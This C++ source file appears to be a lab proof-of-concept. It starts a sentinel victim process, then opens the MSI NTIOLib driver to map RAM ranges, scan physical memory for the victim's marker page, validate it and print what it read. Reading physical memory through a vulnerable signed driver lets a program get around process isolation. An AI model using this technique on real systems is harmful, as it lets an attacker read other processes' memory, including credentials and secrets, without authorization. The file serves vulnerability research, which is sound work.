#include "NtiolibReader.h"

#include <windows.h>

#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>

constexpr wchar_t targetPath[] =
    L"C:\\NtiolibLab\\bin\\ntiolib_target.exe";
constexpr char targetMagic[16] = {
    'M', 'S', 'I', '_', 'N', 'T', 'I', 'O', '_', 'V', 'I', 'C', 'T', 'I', 'M', '\0'
};
constexpr std::size_t pageSize = 4096;
constexpr std::uint32_t maximumPageIndex = 1048576;

#pragma pack(push, 1)
struct TSentinelHeader {
    char magic[16];
    std::uint64_t seed;
    std::uint32_t processId;
    std::uint32_t pageIndex;
    std::uint8_t verifier[32];
    char text[128];
};
#pragma pack(pop)

std::uint64_t DeriveSeed(std::uint32_t processId) {
    return UINT64_C(0xA5103D7B9246EC11) ^
           (static_cast<std::uint64_t>(processId) *
            UINT64_C(0x9E3779B97F4A7C15));
}

std::uint64_t NextRandom(std::uint64_t &state) {
    state ^= state >> 12;
    state ^= state << 25;
    state ^= state >> 27;

    return state * UINT64_C(0x2545F4914F6CDD1D);
}

std::uint64_t InitialPageState(
    std::uint64_t seed,
    std::uint32_t processId,
    std::uint32_t pageIndex) {
    std::uint64_t state = seed;
    state ^= static_cast<std::uint64_t>(processId) << 32;
    state ^=
        static_cast<std::uint64_t>(pageIndex) * UINT64_C(0xD6E8FEB86659FD93);

    return state != 0 ? state : UINT64_C(0xD1B54A32D192ED03);
}

bool ValidatePage(const std::uint8_t *page) {
    const auto *header = reinterpret_cast<const TSentinelHeader *>(page);
    if (std::memcmp(header->magic, targetMagic, sizeof(targetMagic)) != 0 ||
        header->processId == 0 || header->pageIndex >= maximumPageIndex ||
        header->seed != DeriveSeed(header->processId)) {
        return false;
    }

    constexpr char textPrefix[] =
        "Target-only memory read through MSI NTIOLib:";
    if (std::strncmp(header->text, textPrefix, sizeof(textPrefix) - 1) != 0) {
        return false;
    }

    std::uint64_t state = InitialPageState(
        header->seed,
        header->processId,
        header->pageIndex);
    for (const std::uint8_t value : header->verifier) {
        if (value != static_cast<std::uint8_t>(NextRandom(state))) {
            return false;
        }
    }

    return true;
}

bool StartTarget(DWORD &processId) {
    STARTUPINFOW startup = {};
    startup.cb = sizeof(startup);
    PROCESS_INFORMATION process = {};
    if (!CreateProcessW(
            targetPath,
            nullptr,
            nullptr,
            nullptr,
            FALSE,
            CREATE_NO_WINDOW,
            nullptr,
            nullptr,
            &startup,
            &process)) {
        return false;
    }

    processId = process.dwProcessId;
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);
    Sleep(3000);

    return true;
}

int Run() {
    DWORD launchedProcessId = 0;
    if (!StartTarget(launchedProcessId)) {
        std::fprintf(stderr, "start_target_failed=%lu\n", GetLastError());

        return 1;
    }

    NtiolibReader::CPhysicalMemory physicalMemory;
    if (!physicalMemory.openDriver()) {
        std::fprintf(stderr, "open_driver_failed=%lu\n", GetLastError());

        return 1;
    }

    if (!physicalMemory.loadWindowsRamRanges()) {
        std::fprintf(stderr, "load_ram_ranges_failed=true\n");

        return 1;
    }

    std::printf("driver_open=true\n");
    std::printf("driver_handshake=true\n");
    std::printf("target_metadata_file=false\n");
    std::printf("remote_process_handle_used=false\n");
    std::printf("accessible_range_count=%llu\n",
                static_cast<unsigned long long>(
                    physicalMemory.accessibleRangeCount()));
    std::printf("accessible_byte_count=%llu\n",
                static_cast<unsigned long long>(
                    physicalMemory.accessibleByteCount()));
    std::printf("minimum_physical_address=0000000100000000\n");
    std::printf("maximum_physical_address=%016llX\n",
                static_cast<unsigned long long>(
                    physicalMemory.maximumPhysicalAddress()));

    std::uint64_t searchAddress = UINT64_C(0x100000000);
    std::vector<std::uint8_t> page(pageSize);
    TSentinelHeader header = {};
    std::uint64_t recordAddress = 0;
    bool found = false;
    while (physicalMemory.findPhysicalPattern(
        targetMagic,
        sizeof(targetMagic),
        searchAddress,
        recordAddress)) {
        const std::uint64_t pageAddress = recordAddress & ~(pageSize - 1);
        if (recordAddress == pageAddress &&
            physicalMemory.readPhysical(
                pageAddress,
                page.data(),
                page.size()) &&
            ValidatePage(page.data())) {
            std::memcpy(&header, page.data(), sizeof(header));
            found = true;
            break;
        }

        searchAddress = recordAddress + 1;
    }

    if (!found) {
        std::fprintf(stderr, "target_record_not_found=true\n");

        return 1;
    }

    header.text[sizeof(header.text) - 1] = '\0';
    std::printf("physical_target_record=%016llX\n",
                static_cast<unsigned long long>(recordAddress));
    std::printf("process_id_source=scanned_target_memory\n");
    std::printf("scanned_process_id=%lu\n",
                static_cast<unsigned long>(header.processId));
    std::printf("launched_process_id=%lu\n",
                static_cast<unsigned long>(launchedProcessId));
    std::printf("process_id_matches=%s\n",
                header.processId == launchedProcessId ? "true" : "false");
    std::printf("page_index=%lu\n",
                static_cast<unsigned long>(header.pageIndex));
    std::printf("read_text=%s\n", header.text);
    std::printf("page_validation=true\n");
    std::printf("status=SUCCESS\n");

    return header.processId == launchedProcessId ? 0 : 1;
}

int main() {
    return Run();
}
